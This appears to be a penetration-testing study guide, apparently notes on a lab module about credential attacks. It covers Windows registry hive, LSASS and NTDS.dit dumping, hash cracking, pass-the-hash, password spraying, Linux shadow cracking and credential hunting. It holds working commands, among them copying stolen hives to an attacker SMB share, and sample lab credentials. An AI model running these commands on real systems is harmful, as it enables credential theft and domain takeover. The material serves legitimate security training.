### 4. Remote Automated Dumping (`netexec`)

The last section discusses doing all of this automatically without manually copying files back and forth.

Using a tool called **`netexec`** (formerly CrackMapExec), an analyst can feed administrative credentials into a single command over the network. The tool connects via SMB protocols, dumps either the **LSA secrets** (`--lsa`) or the **SAM database** (`--sam`) remotely, and saves them directly to the attack system database instantly.

### 1. Local Manual Dumping Method

#### Step 1: Export Registry Hives

Run these inside an **Administrative Command Prompt (CMD)** on the compromised Windows target to clone the encrypted databases.

DOS

```
:: Save the local account hashes
reg.exe save hklm\sam C:\sam.save

:: Save the boot/syskey required to decrypt the SAM
reg.exe save hklm\system C:\system.save

:: Save LSA secrets and domain cached credentials
reg.exe save hklm\security C:\security.save
```

#### Step 2: Host an SMB Share on Attacker Machine

Run this on your **Linux Attack Host** to create a landing folder named `CompData` that maps to a directory on your machine.

Bash

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

#### Step 3: Transfer the Hives to Your Attacker Machine

Run these on the **Windows Target** to send the saved files over the network back to your machine (replace `10.10.15.16` with your attacker IP).

DOS

```
move sam.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
```

#### Step 4: Extract the Hashes Offline

Run this on your **Linux Attack Host** in the folder where the `.save` files were received to extract local hashes, cached domain logons, and DPAPI keys.

Bash

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### 2. Password Cracking (Offline)

Run these commands on your **Linux Attack Host** against the extracted hashes using the `rockyou.txt` wordlist.

#### Crack Local Windows Hashes (NTLM)

Uses mode `-m 1000`:

Bash

```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

#### Crack Domain Cached Credentials (DCC2 / MS Cache 2)

Uses mode `-m 2100` (Note the single quotes around the hash to prevent bash from breaking on special characters):

Bash

```
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

### 3. Decrypting DPAPI (Chrome Passwords)

Run these inside **Mimikatz** on the **Windows Target** to decrypt saved browser credentials manually using the system's DPAPI structure.

DOS

```
:: Launch Mimikatz
mimikatz.exe

:: Decrypt Chrome's login database
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

### 4. Remote Automated Method (NetExec)

If you already have administrative credentials (`bob : HTB_@cademy_stdnt!`), you can bypass the manual copying process entirely. Run these from your **Linux Attack Host** to dump secrets over the network seamlessly.

#### Remote LSA Secrets Dump

Extracts DPAPI keys, scheduled task credentials, and service accounts:

Bash

```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### Remote SAM Database Dump

Extracts all local user NTLM hashes:

Bash

```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

***

***

## Attacking Lsass

**LSASS** stands for **Local Security Authority Subsystem Service** (running via the process **`lsass.exe`**).

When a user logs into a Windows machine, LSASS acts as the active "security gatekeeper." Instead of making the user type their password every single time they access a network share, open a corporate app, or modify system files, LSASS does the following:

* **Caches credentials locally in memory** (as hashes or sometimes plaintext keys).
* **Generates access tokens** that act like a temporary digital identity badge.
* **Enforces security policies** across the operating system.

> **The Penetration Tester's Strategy:** If you have local administrative rights on a target system, you can pull a copy of everything sitting inside LSASS's memory allocation and analyze it offline on your attack host without making noise on the target machine.

### 2. Phase 1: Creating the Memory Dump

To look inside LSASS without causing a system crash, you must generate a mini-dump (`.dmp`) file. The module highlights two main methods using native, built-in Windows features:

#### Method A: Graphical (Task Manager)

If you have a remote desktop (RDP) or interactive graphical session:

1. Open **Task Manager** -> Go to the **Processes** tab.
2. Find **Local Security Authority Process** (`lsass.exe`).
3. Right-click it and select **Create dump file**.

* _Result:_ Windows creates an `lsass.DMP` file in the user's temporary directory (`%temp%`).

#### Method B: Command Line (`Rundll32.exe` & `Comsvcs.dll`)

If you only have a command-line shell (like PowerShell or CMD), you cannot open Task Manager. Instead, you use a trick:

1. **Find the Process ID (PID):** You must find the unique identification number assigned to `lsass.exe` using `tasklist /svc` (CMD) or `Get-Process lsass` (PowerShell).
2.  **Execute the Dump:** Run a built-in Windows binary (`rundll32.exe`) to force a legitimate system library (`comsvcs.dll`) to execute its internal `MiniDumpWriteDump` function.

    PowerShell

    ```
    rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
    ```

> **Security Note:** Antivirus and EDR tools are highly sensitive to the command-line method and will frequently block it as malicious activity unless disabled or bypassed.

### 3. Phase 2: Extracting Credentials via `Pypykatz`

Once the `.dmp` file is transferred back to your Linux attack host (e.g., via an Impacket SMB share), you need to parse it.

The tool used is **Pypykatz**—a version of the legendary Windows tool _Mimikatz_ written entirely in Python. Running it offline on Linux avoids running malicious code directly on the target machine.

#### The Parsing Command:

To parse the raw memory file and extract the secrets, run the following command in your Linux terminal (replacing the path with your actual file location):

Bash

```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

When you execute this command, Pypykatz reads the memory structure and categorizes its findings by their structural **Authentication Packages**:

| **Package Provider** | **What it Does / What it Contains**                                                                | **Value to an Assessor**                                                                                                                        |
| -------------------- | -------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| **`== MSV ==`**      | The default local authentication package used to validate accounts against the local SAM database. | Contains the account's **NT Hash** (and SHA1 hash). This can be fed directly into Hashcat for cracking.                                         |
| **`== WDIGEST ==`**  | A legacy web-based authentication protocol.                                                        | On older versions of Windows (or unpatched legacy servers), it **caches passwords in clear-text**. You will see the literal plaintext password. |
| **`== Kerberos ==`** | The standard network authentication protocol used in Active Directory Domain environments.         | Contains domain user tickets, PINs, and session keys. These can be used to pivot laterally to other servers on the domain.                      |
| **`== DPAPI ==`**    | The Data Protection Application Programming Interface.                                             | Contains the user's **master keys**. These keys can decrypt saved passwords stored in local applications like Google Chrome or Outlook.         |

### 4. Phase 3: Password Cracking

After Pypykatz extracts the raw data, you look for the user's scrambled password hash. In the text's example, it isolates an NT Hash for the user `bob`:

$$\text{64f12cddaa88057e06a81b54e73b949b}$$

Because NT hashes are fast to compute, you can pass them into **Hashcat** using mode **`-m 1000`** (which tells Hashcat it is processing standard Windows NT/NTLM hashes) against a large dictionary file like `rockyou.txt`:

Bash

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

Hashcat runs through millions of guesses a second, matches the cryptographic signature, and exposes the clear-text password (`Password1`), completing the attack cycle.

***

***

## Attacking Active Directory and NTDS.dit

When a Windows machine joins a domain, it stops using its local SAM database for domain accounts and instead routes login requests to the **Domain Controller (DC)**. This chapter walks you through the entire lifecycle of an active directory credential attack: from OSINT name collection to harvesting every single hash on the corporate domain.

### 1. Building the Target List (OSINT & Naming Conventions)

Before attacking a Domain Controller over the network, you need target accounts. Since active directory networks typically use a predictable pattern for building corporate identities, you can guess them using employee names harvested from public directories or social media.

#### Naming Conventions Matrix

| **Format Type**               | **Template**    | **Example (Jane Doe)** |
| ----------------------------- | --------------- | ---------------------- |
| **First Initial + Last Name** | `flast`         | `jdoe`                 |
| **First Name + Last Name**    | `firstlastname` | `janedoe`              |
| **First Name . Last Name**    | `first.last`    | `jane.doe`             |

Instead of making variations manually, you use **`username-anarchy`** to take a list of plain names and automatically generate thousands of combinations based on these standard enterprise formats.

### 2. Finding Entry Points (Kerbrute & NetExec)

Once you have a massive list of potential usernames, you validate them and hunt for weak passwords using two distinct steps:

#### Step A: Validating Users via Kerbrute (`userenum`)

Instead of guessing passwords blindly, you use **Kerbrute** to check if the accounts even exist.

* It talks directly to the Kerberos Key Distribution Center (KDC) on **Port 88**.
* Because it only asks _"Does this user exist?"_ and doesn't attempt a bad password login, it **does not trigger account lockout policies**.

#### Step B: Password Brute Forcing via NetExec

Once you isolate confirmed, valid accounts, you switch to **NetExec** to test password lists (like `fasttrack.txt`) over the SMB protocol (Port 445).

Bash

```
netexec smb <Target_IP> -u <username> -p <password_list>
```

> ⚠️ **Operational Risk:** If an account lockout threshold policy is actively enforced via Group Policy, password spraying or brute forcing can rapidly lock employees out of their workstations, alerting security operations.

### 3. Extracting the Holy Grail (`NTDS.dit`)

The **`ntds.dit`** file is the central database of an Active Directory domain. It is located at `%systemroot%\NTDS\ntds.dit` on the Domain Controller and contains every username, group membership, and active cryptographic password hash for the entire organization.

Because the Windows operating system constantly reads and writes to this database, it is permanently locked. You cannot simply copy it. You must use one of two methods to bypass this restriction:

#### Method 1: The Manual Approach (Volume Shadow Copy)

If you gain administrative access to the DC (e.g., logging in via `Evil-WinRM`), you use the native **Volume Shadow Copy Service (VSS)** to create a background snapshot of the drive:

1. **Create Snapshot:** Use `vssadmin CREATE SHADOW /For=C:` to duplicate the volume state.
2. **Exfiltrate Database:** Copy the locked `ntds.dit` file and the `SYSTEM` hive registry keys straight out of the virtual shadow copy mount points onto your attack host.
3. **Parse Offline:** Run `impacket-secretsdump` against both files to parse and extract the scrambled NT hashes.

#### Method 2: The Automated Approach (`NetExec + ntdsutil`)

As shown in your terminal execution, you can bypass the manual steps completely. By passing the **`-M ntdsutil`** module flag to NetExec, the tool authenticates as an administrator, instructs the DC to bundle the database natively via its internal administrative tools, drops the output to a temporary directory, copies it back to your local Kali database, and cleans up after itself seamlessly.

### 4. Post-Exploitation Actions

Once you have extracted the domain hashes from the database, you have two strategic choices to advance your assessment:

#### Choice A: Cracking the Hashes (Offline)

You pass the extracted NT hash into **Hashcat** using mode **`-m 1000`** against a target wordlist to reveal the clear-text password.

Bash

```
sudo hashcat -m 1000 <NT_Hash> /usr/share/wordlists/rockyou.txt
```

#### Choice B: Pass-the-Hash (Lateral Movement)

If a high-value account (like the Domain Administrator) has an exceptionally complex password that cannot be cracked, you do not need to decrypt it. Because Windows uses NTLM authentication, you can pass the raw, encrypted hash directly into tools like **Evil-WinRM** using the **`-H`** flag to log straight into systems:

Bash

```
evil-winrm -i <Target_IP> -u Administrator -H <Raw_NT_Hash>
```

### Finding Entry Points & Expanded NetExec Operations

Once you have your list of potential usernames, you validate them using **Kerbrute** (`userenum`) on Port 88 to avoid locking out accounts. Once valid accounts are mapped, you switch to **NetExec** to perform password attacks and privilege enumeration via SMB (Port 445).

#### Common NetExec Command Variations:

*   **Checking the Domain Password Policy (Safe Recon):** Before spraying passwords, always check the lockout threshold so you don't lock out the entire company. Bash

    ```
    netexec smb 10.129.70.161 -u '' -p '' --pass-pol
    ```
*   **Password Spraying (One Password vs. Many Users):** Testing a single common password against your entire list of discovered usernames. Bash

    ```
    netexec smb 10.129.70.161 -u ad_usernames.txt -p 'Winter2026!'
    ```
*   **Brute Forcing (One User vs. A List of Passwords):** Testing a full dictionary file against a single known valid account. Bash

    ```
    netexec smb 10.129.70.161 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
    ```
*   **Verifying Local Admin Rights (`Pwn3d!` Check):** Testing a working credential to see if it holds administrative rights over the target machine. Bash

    ```
    netexec smb 10.129.70.161 -u bwilliamson -p 'P@55w0rd!'
    ```

### 3. Extracting the Holy Grail (`NTDS.dit`)

The **`ntds.dit`** file is the heart of Active Directory, storing all domain hashes. Because it is actively running, the operating system locks it. You must use administrative privileges to duplicate it via alternative OS mechanisms.

#### Method A: The Complete Manual Method (VSS & Registry Extraction)

If you are logged into the Domain Controller via a shell (like `Evil-WinRM`), you must manually create a Volume Shadow Copy snapshot, pull the database, and export the registry key needed to decrypt it.

*   **Step 1: Create a Volume Shadow Copy snapshot of the drive:** PowerShell

    ```
    vssadmin create shadow /for=C:
    ```

    _(Note down the harddisk volume path printed out, e.g., `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`)_
*   **Step 2: Copy the locked NTDS database out of the snapshot:** DOS

    ```
    cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\Windows\Tasks\ntds.dit
    ```
*   **Step 3: Save the SYSTEM registry hive (Contains the boot key needed for decryption):** DOS

    ```
    reg save HKLM\SYSTEM C:\Windows\Tasks\SYSTEM.bak
    ```
*   **Step 4: Download both files to Kali and parse them offline using Secretsdump:** Bash

    ```
    impacket-secretsdump -ntds ntds.dit -system SYSTEM.bak local
    ```

#### Method B: The Manual Native Alternative (`ntdsutil`)

If you don't want to use VSS administration tools, you can use the native Active Directory database management tool `ntdsutil` directly inside the Windows command line to create an Install From Media (IFM) capture:

DOS

```
ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Tasks\Dump" q q
```

_(This automatically pulls `ntds.dit` and the registry hives into the specified folder without generating a whole drive shadow copy)._

#### Method C: The Automated NetExec Method

Instead of running manual scripts on the target, you can instruct NetExec to execute the `ntdsutil` process or use specialized synchronization protocols (`DRSUAPI`) remotely from your Kali machine to automatically pull and dump the hashes:

Bash

```
# Using the ntdsutil method automatically
netexec smb 10.129.70.161 -u bwilliamson -p 'P@55w0rd!' -M ntdsutil

# Using the stealthier network replication method (DRSUAPI)
netexec smb 10.129.70.161 -u bwilliamson -p 'P@55w0rd!' --ntds drsuapi
```

### 4. Post-Exploitation Actions

*   **Pass-the-Hash (PtH):** If you extract a high-value administrator hash that cannot be cracked using Hashcat, you can pass its raw NT string into **Evil-WinRM** using the **`-H`** flag to gain immediate entry: Bash

    ```
    evil-winrm -i 10.129.70.161 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
    ```

***

***

## Credential Hunting in Windows

### The Core Philosophy: Search-Centric Targeting

Instead of executing random directory listings, effective credential hunting mirrors the daily habits of the target user. Because this target is an **IT Administrator**, their workstation is highly likely to contain deployment templates, scripting workflows, and connections to critical infrastructure.

#### Primary Keywords to Target

When searching files, environment variables, or databases, prioritize structural variations of these specific keywords:

* `password` / `passphrase` / `pwd` / `passkey`
* `useraccount` / `creds` / `login`
* `dbcredential` / `dbpassword` / `configuration`

### 2. Automated Harvesting via LaZagne

**LaZagne** is a modular post-exploitation password extraction tool designed to parse plaintext credentials stored insecurely by popular third-party applications. Instead of manual database hunting, it automatically locates, decrypts, and prints secrets from various software categories.

#### LaZagne Module Matrix

| **Module**     | **Attack Vectors & Targets**                                                                           |
| -------------- | ------------------------------------------------------------------------------------------------------ |
| **`browsers`** | Extracts autofill databases and cookies from Chromium, Edge, Firefox, Opera, etc.                      |
| **`chats`**    | Targets communication application stores like Skype.                                                   |
| **`mails`**    | Parses configuration profiles and cache for desktop mail clients like Outlook and Thunderbird.         |
| **`sysadmin`** | Hunts through configuration files for administrative infrastructure utilities like OpenVPN and WinSCP. |
| **`windows`**  | Queries Windows-specific internals: LSA Secrets, Domain Cache, and Credential Manager Vaults.          |
| **`memory`**   | Performs dynamic analysis/dumps targeting runtime spaces of processes like KeePass and LSASS.          |
| **`wifi`**     | Extracts cleartext WPA/WPA2 wireless profiles stored globally on the system.                           |

> 💡 **Execution Tip:** Running `start LaZagne.exe all -vv` executes every module simultaneously while displaying detailed verbose logs tracking precisely where authentication entries are discovered.

### 3. Native Pattern Matching via `findstr`

When third-party binaries are blocked or unavailable, you can rely on the native Windows command-line engine **`findstr`** to recursively audit the local file system for exposed configuration keys.

#### Command Breakdown

DOS

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

* **`/S`**: Instructs the engine to search the current working directory and **all subdirectories** recursively.
* **`/I`**: Enforces a **case-insensitive** match (capturing `Password`, `PASSWORD`, and `pAsSwOrD`).
* **`/M`**: Optimization flag that **only prints the file name** containing the match, filtering out long walls of irrelevant text.
* **`/C:"string"`**: Explicitly matches the literal phrase inside the quotes.
* **Extensions (`*.txt *.xml ...`)**: Restricts the search matrix to common configuration, script, and plain-text containers to avoid checking massive binary files.

### 4. High-Value Forensic Locations

Administrators frequently leave systemic patterns of deployment files across predictable shares and directories. When manually hunting, always enumerate these targets:

* **`unattend.xml` / `sysprep.inf`**: Windows setup answer files often left behind in deployment directories (`C:\Windows\Panther\`), which routinely store local administrator setup passwords in plain text or base64.
* **SYSVOL Share (`\\<Domain>\SYSVOL\`)**: The public Active Directory network share where Group Policy Objects (GPOs), login scripts, and bulk onboarding batch files are distributed.
* **`web.config`**: Core configuration environments on development stations or application hosts containing hardcoded MSSQL/database connection strings.
* **Active Directory Description Fields**: Querying user objects for plain-text notes added by helpdesk operators (e.g., _"Default password set to Welcome123"_).

***

***

## Linux Authentication Process

### 1. The Authentication Engine: PAM

Linux uses **Pluggable Authentication Modules (PAM)** as a flexible architecture to handle user authentication, account management, session setups, and password updates.

* **The Core Driver:** The primary module responsible for traditional local account management is `pam_unix.so`.
* **The Interaction:** When an operational command like `passwd` is executed, PAM interceptively hooks the process, validates user criteria, and pushes updates straight to the system's storage configuration boundaries.

### 2. The Local Storage Divide

To balance convenience with high-level security, Linux separates user identity data from cryptographic password assets into two distinct files.

#### A. The Identity File: `/etc/passwd`

This file serves as a global, **world-readable** directory listing every account configured on the system. It uses a 7-field structure separated by colons (`:`):

Plaintext

```
username : password : UID : GID : GECOS : home_directory : shell
```

* **The `x` Placeholder:** In modern deployments, you will find a literal `x` in the password field. This tells the OS that the actual password hash has been safely offloaded to the secure shadow database.
* **The Write Misconfiguration Risk:** If an inexperienced administrator accidentally grants global write privileges to `/etc/passwd`, an attacker can modify this file directly. By removing the `x` placeholder entirely for a user (e.g., `root::0:0...`), that account instantly switches to **passwordless authentication**, allowing an immediate root login shell via `su`.

#### B. The Hash File: `/etc/shadow`

Because password hashes are highly sensitive, they are isolated inside `/etc/shadow`, which is strictly **restricted to administrative (root) access**. It tracks password expiration, age limits, and the raw cryptographic strings across 9 specific colon-separated fields.

### 3. Anatomy of a Linux Password Hash

Inside the `/etc/shadow` file, the password entry itself is systematically split into three sections using dollar signs (`$`) as delimiters:

$$\text{\$\langle id\rangle\$\langle salt\rangle\$\langle hashed\_string\rangle}$$

The **ID identifier** specifies exactly which mathematical algorithm scrambled the plaintext entry. Recognizing these flags dictates how you build your offline recovery configurations:

| **Hash ID Flag** | **Cryptographic Algorithm** | **Relative Security Level / Notes**                                                               |
| ---------------- | --------------------------- | ------------------------------------------------------------------------------------------------- |
| **`$1$`**        | MD5                         | Legacy, highly optimized compute time; exceptionally fast to crack.                               |
| **`$2a$`**       | Blowfish (bcrypt)           | Strong, resource-expensive hashing footprint.                                                     |
| **`$5$`**        | SHA-256                     | Standard secure configuration on mid-tier modern builds.                                          |
| **`$6$`**        | SHA-512                     | Historically dominant standard; highly secure but crackable with wordlists.                       |
| **`$y$`**        | yescrypt                    | The current default for modern distributions (like Debian/Kali); high memory-hardness parameters. |

### 4. Historical Pattern Harvesting: `/etc/security/opasswd`

When users try to cycle their passwords, PAM references the `/etc/security/opasswd` file to ensure they aren't reusing old choices.

* **The Value for Attackers:** This file holds historical password hashes for local users.
* **Pattern Analysis:** If an enterprise target uses an outdated hashing algorithm (like MD5) for legacy history records while using SHA-512 for active accounts, an auditor can rapidly crack the old historical hash. Because humans are highly predictable, identifying the old baseline password allows you to easily guess the current active password variant by predicting minor suffix shifts (e.g., `Summer2025!` shifting to `Winter2026!`).

### 5. The Offline Credential Cracking Pipeline

If you secure administrative control over a Linux target, you can extract the raw configuration text maps to execute offline password cracking on your local attack rig:

#### Step 1: Stage the target files

Copy the target files safely into a workspace directory:

Bash

```
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
```

#### Step 2: Merge structures using `unshadow`

John the Ripper's built-in utility parses both source layouts, aligns the matching usernames to their restricted shadow rows, and outputs a single, clean file structure:

Bash

```
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Step 3: Execute the dictionary attack via Hashcat

Pass the newly unified text database straight into `hashcat`. For example, if the ID flag inside the file indicates a SHA-512 format, you utilize mode `1800`:

Bash

```
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

***

***

#### Linux Credential Hunting: Files and Commands

| **File / Category / Path**                                                                                                                                                     | **Description**                                                                                       | **Command(s)**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| <p><strong>Configuration Files</strong><br><br><br><br>(<code>.conf</code>, <code>.config</code>, <code>.cnf</code>)</p>                                                       | Core service settings; often contain plaintext passwords or system user configurations.               | <p><strong>Find config files:</strong><br><br><br><br><code>for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done</code><br><br><br><br><br><strong>Search inside <code>.cnf</code> files for credentials:</strong><br><br><br><br><code>for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done</code></p>              |
| <p><strong>Databases</strong><br><br><br><br>(<code>.sql</code>, <code>.db</code>, <code>.*db</code>, <code>.db*</code>)</p>                                                   | Databases stored locally that may contain user tables or application credentials.                     | <p><strong>Find database files:</strong><br><br><br><br><code>for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done</code></p>                                                                                                                                                                                                                                                                                      |
| <p><strong>Notes / Text Files</strong><br><br><br><br>(<code>.txt</code> or no extension)</p>                                                                                  | Documentation, setup notes, or lists of credentials left by administrators/users.                     | <p><strong>Find text files or extensionless files in home directories:</strong><br><br><br><br><code>find /home/* -type f -name "*.txt" -o ! -name "*.*"</code></p>                                                                                                                                                                                                                                                                                                                                                     |
| <p><strong>Scripts</strong><br><br><br><br>(<code>.py</code>, <code>.pyc</code>, <code>.pl</code>, <code>.go</code>, <code>.jar</code>, <code>.c</code>, <code>.sh</code>)</p> | Automation scripts that might hardcode administrative or service passwords to run unattended.         | <p><strong>Find script files:</strong><br><br><br><br><code>for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done</code></p>                                                                                                                                                                                                                                                                                      |
| <p><strong>System-wide Cronjobs</strong><br><br><br><br><code>/etc/crontab</code></p>                                                                                          | Scheduled tasks run by the system. Applications or scripts run here may mistakenly pass credentials.  | `cat /etc/crontab`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| <p><strong>Cron Directories</strong><br><br><br><br><code>/etc/cron.*/</code> &#x26; <code>/etc/cron.d/</code></p>                                                             | Directories holding periodic execution scripts (daily, hourly, monthly, weekly).                      | `ls -la /etc/cron.*/`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| <p><strong>History Files</strong><br><br><br><br><code>.bash_history</code>, <code>.bashrc</code>, <code>.bash_profile</code></p>                                              | Records of user commands (which may accidentally include typed passwords) and environment setups.     | <p><strong>View last 5 lines of all user histories:</strong><br><br><br><br><code>tail -n5 /home/*/.bash*</code></p>                                                                                                                                                                                                                                                                                                                                                                                                    |
| <p><strong>System &#x26; Service Logs</strong><br><br><br><br><code>/var/log/*</code></p>                                                                                      | Track authentication, background jobs, service actions, and errors. Refer to the specific logs below. | <p><strong>Search logs for security/credential events:</strong><br><br><br><br><code>for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done</code></p> |
| <p><strong>Browser Profiles</strong><br><br><br><br><code>.mozilla/firefox/</code></p>                                                                                         | Contains saved browser credentials, encryption keys, and session databases.                           | <p><strong>Identify the Firefox profile folder:</strong><br><br><br><br><code>ls -l .mozilla/firefox/ \| grep default</code></p>                                                                                                                                                                                                                                                                                                                                                                                        |
| <p><strong>Firefox Saved Logins</strong><br><br><br><br><code>logins.json</code></p>                                                                                           | Stores encrypted web credentials saved by the user.                                                   | <p><strong>View raw JSON content:</strong><br><br><br><br><code>cat .mozilla/firefox/&#x3C;profile_name>/logins.json \| jq .</code><br><br><br><br><br><strong>Decrypt the credentials using tools:</strong><br><br><br><br><code>python3.9 firefox_decrypt.py</code></p>                                                                                                                                                                                                                                               |

#### Key Log Files to Monitor in `/var/log/`

| **Log File Path**                       | **Description**                                              |
| --------------------------------------- | ------------------------------------------------------------ |
| `/var/log/messages` & `/var/log/syslog` | Generic system activity logs.                                |
| `/var/log/auth.log`                     | Debian/Ubuntu authentication logs (logins, `sudo` attempts). |
| `/var/log/secure`                       | RedHat/CentOS authentication logs.                           |
| `/var/log/boot.log`                     | Booting sequence information.                                |
| `/var/log/dmesg`                        | Hardware and driver-related data.                            |
| `/var/log/kern.log`                     | Kernel warnings, errors, and logs.                           |
| `/var/log/faillog`                      | Failed login attempts.                                       |
| `/var/log/cron`                         | Execution history of cron jobs.                              |
| `/var/log/mail.log`                     | Mail server processes and operations.                        |
| `/var/log/httpd`                        | Apache web server logs.                                      |
| `/var/log/mysqld.log`                   | MySQL database server logs.                                  |

### 1. Mimipenguin

#### What it does

`mimipenguin` is a post-exploitation tool used to dump cleartext credentials from the memory or cache of running applications and processes on Linux distributions.

#### Important Points

* Targets system-required credentials for currently logged-in users.
* Extracts credentials that applications store temporarily in memory to reuse for authentication.
* **Requirement:** It strictly requires administrator/root privileges (`sudo`) to read system memory.

#### Output

Code snippet

```
Umedh@htb[/htb]$ sudo python3 mimipenguin.py
[SYSTEM - GNOME]    cry0l1t3:WLpAEXFa0SbqOHY
```

### 2. LaZagne

#### What it does

`LaZagne` is a powerful, multi-platform credential-dumping application used to extract passwords and hashes from a wide variety of local subsystems, configuration files, and software.

#### Important Points

* It can extract credentials from countless sources including: Shadow passwords, Wifi, `wpa_supplicant`, Git, AWS, Docker, Keyrings (`Kwallet`, `Libsecret`), SSH, Apache, KeePass, and browsers.
* Can be run with the `all` flag to search every supported application, or targeted at specific modules like `browsers`.
* Helps bypass OS-based password managers (Keyrings) that save repeated password entries.

#### Output (All Modules / Shadow Passwords)

Code snippet

```
Umedh@htb[/htb]$ sudo python2.7 laZagne.py all
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|
------------------- Shadow passwords -----------------
[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::
[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::
[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY
[+] 3 passwords have been found.
For more information launch it again with the -v option
elapsed time = 3.50091600418
```

#### Output (Browsers Module Only)

Code snippet

```
Umedh@htb[/htb]$ python3 laZagne.py browsers
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|
------------------- Firefox passwords -----------------
[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test
[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh
[+] 2 passwords have been found.
For more information launch it again with the -v option
elapsed time = 0.2310788631439209
```

### 3. Firefox Decrypt

#### What it does

`Firefox Decrypt` is a Python utility specifically designed to locate, parse, and decrypt saved usernames and passwords stored locally by the Mozilla Firefox browser.

#### Important Points

* Firefox stores encrypted credentials in a hidden user profile directory inside a file named `logins.json`.
* The tool automatically looks for existing browser profiles and allows the attacker to choose which profile to target.
* **Version Compatibility:** The latest version of the tool requires Python 3.9 to run. If Python 3.9 is unavailable, an older version (Firefox Decrypt 0.7.0) must be executed using Python 2.

#### Output

Code snippet

```
Umedh@htb[/htb]$ python3.9 firefox_decrypt.py
Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release
2
Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'
Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

***

***

## Credential Hunting in Network Traffic

The risk of unencrypted protocols (such as HTTP, FTP, SNMP, and legacy mail streams) that transmit sensitive authentication data across the network in cleartext. It introduces two major tools used to intercept and parse this exposed data.

### 1. Pcredz (The Automated Secrets Extractor)

**Pcredz** is a high-speed command-line tool designed to look through network traffic captures (`.pcap/.pcapng`) or sniff live interfaces to automatically extract credentials and authentication hashes. Instead of requiring you to look through every packet stream manually, it does the scanning for you using internal patterns.

#### Important Points & Capabilities

* **Extracted Data Types:** It can automatically carve out credit card numbers, cleartext passwords for FTP, POP, SMTP, IMAP, SNMP community strings (v1/v2c), and credentials inside HTTP Basic or HTTP Form fields.
* **Windows & Active Directory Hashes:** It pulls down **NTLMv1/v2 hashes** from protocols like SMBv1/v2, LDAP, HTTP, MSSQL, and DCE-RPC. It also grabs **Kerberos (AS-REQ Pre-Auth etype 23)** hashes.
